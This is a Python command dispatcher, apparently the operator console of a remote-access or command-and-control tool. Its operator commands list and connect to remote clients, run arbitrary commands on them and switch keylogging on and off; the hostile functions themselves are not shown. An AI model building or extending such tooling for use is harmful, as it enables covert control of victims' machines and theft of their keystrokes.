import logging


class CommandHandler:
    """
    Handles parsing and execution of both administrative and operator commands.
    """

    def __init__(self, admin_server, operator_shell, main_server):
        self.admin_server = admin_server
        self.operator_shell = operator_shell
        self.main_server = main_server

    def handle(self, command: str, context: str = "admin"):
        """
        Dispatches commands based on the context (admin or operator).

        Args:
            command (str): The command string to execute.
            context (str): The context of the command ('admin' or 'operator').

        Returns:
            str: Result of the executed command or an error message.
        """
        parts = command.split()
        if not parts:
            return "Invalid command. Type 'help' for a list of commands."

        cmd_name = parts[0].lower()

        if context == "admin":
            return self.handle_admin_command(cmd_name, parts)
        elif context == "operator":
            return self.handle_operator_command(cmd_name, parts)
        else:
            logging.error(f"[CommandHandler] Unknown context: {context}")
            return f"Unknown context: {context}. Type 'help' for assistance."

    def handle_admin_command(self, cmd_name: str, parts: list):
        """
        Handles administrative commands.

        Args:
            cmd_name (str): The command name.
            parts (list): The command arguments.

        Returns:
            str: Result of the executed command or an error message.
        """
        if cmd_name == "status":
            return self.admin_server.show_status()
        elif cmd_name == "enable" and len(parts) == 2:
            return self.admin_server.enable_plugin(parts[1])
        elif cmd_name == "disable" and len(parts) == 2:
            return self.admin_server.disable_plugin(parts[1])
        elif cmd_name == "list" and len(parts) == 2 and parts[1] == "plugins":
            return self.admin_server.list_plugins()
        elif cmd_name == "change" and len(parts) == 3 and parts[1] == "pass":
            return self.admin_server.change_password(parts[2])
        elif cmd_name == "exit":
            return self.exit_server()
        else:
            return f"Unknown admin command: {cmd_name}. Type 'help' for assistance."

    def handle_operator_command(self, cmd_name: str, parts: list):
        """
        Handles operator-specific commands.

        Args:
            cmd_name (str): The command name.
            parts (list): The command arguments.

        Returns:
            str: Result of the executed command or an error message.
        """
        if cmd_name == "help":
            return self.get_operator_help()
        elif cmd_name == "list":
            return self.operator_shell.list_clients()
        elif cmd_name == "connect" and len(parts) == 2:
            return self.operator_shell.connect_client(parts[1])
        elif cmd_name == "run" and len(parts) > 1:
            return self.operator_shell.run_command(" ".join(parts[1:]))
        elif cmd_name == "keylogging" and len(parts) == 2:
            return self.operator_shell.handle_keylogging(parts[1])
        elif cmd_name == "exit":
            return self.exit_server()
        else:
            return f"Unknown operator command: {cmd_name}. Type 'help' for assistance."

    def exit_server(self):
        """
        Gracefully shuts down the server.
        """
        logging.info("[CommandHandler] Shutting down server.")
        self.main_server.shutdown()  # Assuming main_server has a shutdown method
        return "Server shutting down..."